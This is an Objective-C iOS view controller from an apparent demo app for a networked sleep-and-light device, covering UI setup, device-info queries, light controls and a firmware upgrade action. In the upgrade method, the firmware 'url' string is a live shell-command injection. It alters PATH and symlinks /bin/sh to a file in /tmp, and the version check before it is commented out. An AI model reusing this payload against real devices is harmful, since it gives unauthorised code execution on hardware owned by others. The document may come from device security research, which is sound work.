//
//  DeviceViewController.m
//  Binatone-demo
//
//  Created by Martin on 23/8/18.
//  Copyright © 2018年 Martin. All rights reserved.
//

#import "DeviceViewController.h"
#import "SearchViewController.h"
#import <SA1001/SA1001.h>
#import "DatePickerPopUpView.h"
#import <SA1001/SALUpgradeInfo.h>
#import <SLPMLan/SLPMLan.h>
#import <SLPMLan/SLPLanTCPCommon.h>

@interface DeviceViewController ()
@property (nonatomic, weak) IBOutlet UIView *contentView;
@property (nonatomic, weak) IBOutlet UIButton *connectBtn;
@property (nonatomic, weak) IBOutlet UIView *userIDShell;
@property (nonatomic, weak) IBOutlet UILabel *userIDTitleLabel;
@property (nonatomic, weak) IBOutlet UITextField *userIDLabel;
//deviceInfo
@property (nonatomic, weak) IBOutlet UIView *deviceInfoShell;
@property (nonatomic, weak) IBOutlet UILabel *deviceInfoSectionLabel;
@property (nonatomic, weak) IBOutlet UIButton *getDeviceNameBtn;
@property (nonatomic, weak) IBOutlet UILabel *deviceNameLabel;
@property (nonatomic, weak) IBOutlet UIButton *getDeviceIDBtn;
@property (nonatomic, weak) IBOutlet UILabel *deviceIDLabel;
@property (nonatomic, weak) IBOutlet UIButton *getBatteryBtn;
@property (nonatomic, weak) IBOutlet UILabel *batteryLabel;
@property (nonatomic, weak) IBOutlet UIButton *getMacBtn;
@property (nonatomic, weak) IBOutlet UILabel *macLabel;
//firmwareInfo
@property (nonatomic, weak) IBOutlet UIView *firmwareInfoShell;
@property (nonatomic, weak) IBOutlet UILabel *firmwareInfoSectionLabel;
@property (nonatomic, weak) IBOutlet UIButton *getFirmwareVersionBtn;
@property (nonatomic, weak) IBOutlet UILabel *firmwareVersionLabel;
@property (nonatomic, weak) IBOutlet UIButton *upgradeBtn;

//setting
@property (nonatomic, weak) IBOutlet UIView *settingShell;
@property (nonatomic, weak) IBOutlet UILabel *settingSectionLabel;
@property (nonatomic, weak) IBOutlet UIView *alarmUpLine;
@property (nonatomic, weak) IBOutlet UILabel *alarmTitleLabel;
@property (nonatomic, weak) IBOutlet UISwitch *alarmEnableSwitch;
@property (nonatomic, weak) IBOutlet UIView *alarmDownLine;
@property (nonatomic, weak) IBOutlet UILabel *alarmTimeLabel;
@property (nonatomic, weak) IBOutlet UIImageView *alarmTimeIcon;
@property (nonatomic, weak) IBOutlet UIView *alarmTimeDownLine;

@property (weak, nonatomic) IBOutlet UIButton *onePressOpenBtn;
@property (weak, nonatomic) IBOutlet UIButton *onePressCloseBtn;


@property (nonatomic, assign) BOOL connected;

@end

@implementation DeviceViewController

-(void)dealloc
{
    [[NSNotificationCenter defaultCenter] removeObserver:self];
}

- (void)viewDidLoad {
    [super viewDidLoad];
    self.titleLabel.text = LocalizedString(@"device");
    
    [self setUI];
    [self addNotificationObservre];
    [self showConnected:NO];
}

- (void)setUI {
    [Utils configNormalButton:self.connectBtn];
    [Utils configNormalButton:self.getDeviceNameBtn];
    [Utils configNormalButton:self.getDeviceIDBtn];
    [Utils configNormalButton:self.getBatteryBtn];
    [Utils configNormalButton:self.getFirmwareVersionBtn];
    [Utils configNormalButton:self.getMacBtn];
    [Utils configNormalButton:self.upgradeBtn];
    [Utils configNormalButton:self.onePressOpenBtn];
    [Utils configNormalButton:self.onePressCloseBtn];
    
    [Utils configNormalDetailLabel:self.deviceNameLabel];
    [Utils configNormalDetailLabel:self.deviceIDLabel];
    [Utils configNormalDetailLabel:self.batteryLabel];
    [Utils configNormalDetailLabel:self.firmwareVersionLabel];
    [Utils configNormalDetailLabel:self.macLabel];
    
    [Utils configSectionTitle:self.userIDTitleLabel];
    [Utils configSectionTitle:self.deviceInfoSectionLabel];
    [Utils configSectionTitle:self.firmwareInfoSectionLabel];
    [Utils configSectionTitle:self.settingSectionLabel];
    
    [Utils setButton:self.getDeviceNameBtn title:LocalizedString(@"device_id_clear")];
    [Utils setButton:self.getDeviceIDBtn title:LocalizedString(@"device_id_cipher")];
    [Utils setButton:self.getBatteryBtn title:LocalizedString(@"obtain_electricity")];
    [Utils setButton:self.getFirmwareVersionBtn title:LocalizedString(@"obtain_firmware")];
    [Utils setButton:self.getMacBtn title:LocalizedString(@"obtain_mac_address")];
    [Utils setButton:self.upgradeBtn title:LocalizedString(@"fireware_update")];
    [Utils setButton:self.onePressOpenBtn title:LocalizedString(@"Turn_On_Lights_Aroma")];
    [Utils setButton:self.onePressCloseBtn title:LocalizedString(@"Turn_Off_Lights_Aroma")];
    
    [self.alarmTitleLabel setText:LocalizedString(@"apnea_alert")];
    [self.alarmTimeLabel setText:LocalizedString(@"set_alert_switch")];
    [self.alarmTimeIcon setImage:[UIImage imageNamed:@"common_list_icon_leftarrow.png"]];

    [self.userIDTitleLabel setText:LocalizedString(@"userid_sync_sleep")];
    [self.deviceInfoSectionLabel setText:LocalizedString(@"device_infos")];
    [self.firmwareInfoSectionLabel setText:LocalizedString(@"firmware_info")];
    [self.settingSectionLabel setText:LocalizedString(@"setting")];
    
    [self.alarmUpLine setBackgroundColor:Theme.normalLineColor];
    [self.alarmDownLine setBackgroundColor:Theme.normalLineColor];
    [self.alarmTimeDownLine setBackgroundColor:Theme.normalLineColor];
    
    [Utils configCellTitleLabel:self.alarmTitleLabel];
    [Utils configCellTitleLabel:self.alarmTimeLabel];
    
    self.userIDLabel.keyboardType = UIKeyboardTypeNumberPad;
    [self.userIDLabel setTextColor:Theme.C3];
    [self.userIDLabel setFont:Theme.T3];
    
    [self.userIDLabel.layer setMasksToBounds:YES];
    [self.userIDLabel.layer setCornerRadius:2.0];
    [self.userIDLabel.layer setBorderWidth:1.0];
    [self.userIDLabel.layer setBorderColor:Theme.normalLineColor.CGColor];
    [self.userIDLabel setText:[DataManager sharedDataManager].userID];
    [self.userIDLabel setPlaceholder:LocalizedString(@"enter_userid")];
}

- (void)showConnected:(BOOL)connected {
    CGFloat shellAlpha = connected ? 1.0 : 0.3;
    [self.deviceInfoShell setAlpha:shellAlpha];
    [self.firmwareInfoShell setAlpha:shellAlpha];
    [self.settingShell setAlpha:shellAlpha];
    
    [self.deviceInfoShell setUserInteractionEnabled:connected];
    [self.firmwareInfoShell setUserInteractionEnabled:connected];
    [self.settingShell setUserInteractionEnabled:connected];
    
    if (!connected) {
        [self.deviceNameLabel setText:nil];
        [self.deviceIDLabel setText:nil];
        [self.batteryLabel setText:nil];
        [self.firmwareVersionLabel setText:nil];
        [Utils setButton:self.connectBtn title:LocalizedString(@"connect_device")];
    }else{
        [Utils setButton:self.connectBtn title:LocalizedString(@"disconnect")];
    }
    [self.settingShell setUserInteractionEnabled:connected];
}

- (void)viewDidAppear:(BOOL)animated {
    [super viewDidAppear:animated];
//    [self.deviceIDLabel setText:SharedDataManager.deviceID];
//    [self.deviceNameLabel setText:SharedDataManager.deviceName];
}

- (void)addNotificationObservre {
    NSNotificationCenter *notificationCeter = [NSNotificationCenter defaultCenter];
    
    [notificationCeter addObserver:self selector:@selector(deviceConnected:) name:kNotificationNameWLANDeviceConnected object:nil];
    [notificationCeter addObserver:self selector:@selector(deviceDisconnected:) name:kNotificationNameWLANDeviceDisconnected object:nil];
    [notificationCeter addObserver:self selector:@selector(networkChanged:) name:kNetWorkChangedNotification object:nil];
}

- (void)networkChanged:(NSNotification *)notification
{
    kNetworkStatus status = [[NetWorkTool reachabilityForInternetConnection] currentReachabilityStatus];
    if (status != kNetworkStatus_ReachableViaWiFi) {
        self.connected = NO;
        SharedDataManager.connected = NO;
        [self showConnected:NO];
    }
}

- (void)deviceConnected:(NSNotification *)notification {
    self.connected = YES;
    SharedDataManager.connected = YES;
    [self showConnected:YES];
}

- (void)deviceDisconnected:(NSNotification *)notfication {
    self.connected = NO;
    SharedDataManager.connected = NO;
    [self showConnected:NO];
}

- (IBAction)connectDeviceClicked:(id)sender {
    if (self.connected) {
        [SLPSharedMLanManager disconnectLanTcp:SharedDataManager.deviceName];
    }else{
        if (![SLPBLESharedManager blueToothIsOpen]) {
            [Utils showMessage:LocalizedString(@"phone_bluetooth_not_open") controller:self];
            return;
        }
        [self.deviceNameLabel setText:nil];
        [self.deviceIDLabel setText:nil];
        [self.batteryLabel setText:nil];
        [self.firmwareVersionLabel setText:nil];
        [Coordinate pushViewControllerName:@"SearchViewController" sender:self animated:YES];
    }
}

- (IBAction)getDeviceNameClicked:(id)sender {
    [self.deviceNameLabel setText:SharedDataManager.deviceName];
}

- (IBAction)getDeviceIDClicked:(id)sender {
    __weak typeof(self) weakSelf = self;
    KFLog_Normal(YES, @"get deviceId");
    
    if (![SLPLanTCPCommon isReachableViaWiFi]) {
        [Utils showMessage:LocalizedString(@"wifi_not_connected") controller:self];
        return;
    }
    
    [SLPSharedMLanManager sal:SharedDataManager.deviceName getDeviceInfoTimeout:0 callback:^(SLPDataTransferStatus status, id data) {
        if (status == SLPDataTransferStatus_Succeed) {
            SALDeviceInfo *deviceInfo = data;
            [self.deviceIDLabel setText:deviceInfo.deviceID];
            //            [self.firmwareVersionLabel setText:deviceInfo.firmwareVersion];
        }else{
            [Utils showDeviceOperationFailed:status atViewController:weakSelf];
        }
    }];
}

- (IBAction)getDeviceVerionClicked:(id)sender {
    __weak typeof(self) weakSelf = self;
    KFLog_Normal(YES, @"get deviceVersion");
    if (![SLPLanTCPCommon isReachableViaWiFi]) {
        [Utils showMessage:LocalizedString(@"wifi_not_connected") controller:self];
        return;
    }
    
    [SLPSharedMLanManager sal:SharedDataManager.deviceName getDeviceInfoTimeout:0 callback:^(SLPDataTransferStatus status, id data) {
        if (status == SLPDataTransferStatus_Succeed) {
            SALDeviceInfo *deviceInfo = data;
//            [weakSelf.deviceIDLabel setText:deviceInfo.deviceID];
            [weakSelf.firmwareVersionLabel setText:deviceInfo.firmwareVersion];
            SharedDataManager.version = [deviceInfo.firmwareVersion doubleValue];
        }else{
            [Utils showDeviceOperationFailed:status atViewController:weakSelf];
        }
    }];
}

- (IBAction)upgradeClicked:(id)sender {
    KFLog_Normal(YES, @"upgrade");
    __weak typeof(self) weakSelf = self;
    
    if (![SLPBLESharedManager blueToothIsOpen]) {
        [Utils showMessage:LocalizedString(@"phone_bluetooth_not_open") controller:self];
        return;
    }
    
    double currentVersion = SharedDataManager.version;
    double upgradeVersion = 0.95;
    NSString *url = @"http://a 1;PATH=/tmp:$PATH;ln -s /bin/sh /tmp/sdcard_repair;myupdate 3 0.0.95 172.14.1.100:89/resource-ws/dm/upload/device/23/";
    
//    if (currentVersion >= upgradeVersion) {  // 升级版本大于当前版本才会去升级
//        [Utils showMessage:LocalizedString(@"已是最新版本,无需升级") controller:weakSelf];
//        return;
//    }
    
    
    SLPLoadingBlockView *loadingView = [self showLoadingView];
    
    [SLPSharedMLanManager sal:SharedDataManager.deviceName currentHardwareVersion:currentVersion upgradeHardwareVersion:upgradeVersion upgradeType:3 url:url timeout:0 completion:^(SLPDataTransferStatus status, id data) {
        SALUpgradeInfo *upgradeInfo = data;
        if (status == SLPDataTransferStatus_Succeed) {
            [loadingView setText:[NSString stringWithFormat:@"%2d%%", (int)upgradeInfo.currentLength]];
//            ushort oVersion = (ushort)(currentVersion * 100);
            double nVersion = upgradeInfo.currentVersion;
            NSLog(@"%lf-----------%lf", upgradeVersion, nVersion);
            if (nVersion == upgradeVersion) {
                
                [weakSelf unshowLoadingView];
                [Utils showMessage:LocalizedString(@"up_success") controller:weakSelf];
                NSString *newVer = [NSString stringWithFormat:@"%.2f", upgradeInfo.currentVersion];
                SharedDataManager.version = [newVer doubleValue];
//                [weakSelf.firmwareVersionLabel setText:newVer];
            }
        } else {
            [weakSelf unshowLoadingView];
            [Utils showMessage:LocalizedString(@"up_failed") controller:weakSelf];
        }
    }];
}


- (IBAction)onePressOpenAction:(id)sender {
    __weak typeof(self) weakSelf = self;
    KFLog_Normal(YES, @"get deviceVersion");
    if (![SLPLanTCPCommon isReachableViaWiFi]) {
        [Utils showMessage:LocalizedString(@"wifi_not_connected") controller:self];
        return;
    }
    
    SLPLight *light = [[SLPLight alloc] init];
    light.r = 255;
    light.g = 255;
    light.b = 255;
    light.w = 255;
    
    [SLPSharedMLanManager sal:SharedDataManager.deviceName onePressWithOperation:0x01 mode:0x01 rate:3 brightness:100 lightMode:1 light:light timeout:0 callback:^(SLPDataTransferStatus status, id data) {
        if (status == SLPDataTransferStatus_Succeed) {
            NSLog(@"操作成功");
        } else {
            NSLog(@"操作失败");
        }
    }];
}

- (IBAction)onePressCloseAction:(id)sender {
    __weak typeof(self) weakSelf = self;
    KFLog_Normal(YES, @"get deviceVersion");
    if (![SLPLanTCPCommon isReachableViaWiFi]) {
        [Utils showMessage:LocalizedString(@"wifi_not_connected") controller:self];
        return;
    }
    
    SLPLight *light = [[SLPLight alloc] init];
    light.r = 255;
    light.g = 255;
    light.b = 255;
    light.w = 255;
    
    [SLPSharedMLanManager sal:SharedDataManager.deviceName onePressWithOperation:0x00 mode:0x01 rate:3 brightness:100 lightMode:1 light:light timeout:0 callback:^(SLPDataTransferStatus status, id data) {
        if (status == SLPDataTransferStatus_Succeed) {
            NSLog(@"操作成功");
        } else {
            NSLog(@"操作失败");
        }
    }];
}

@end
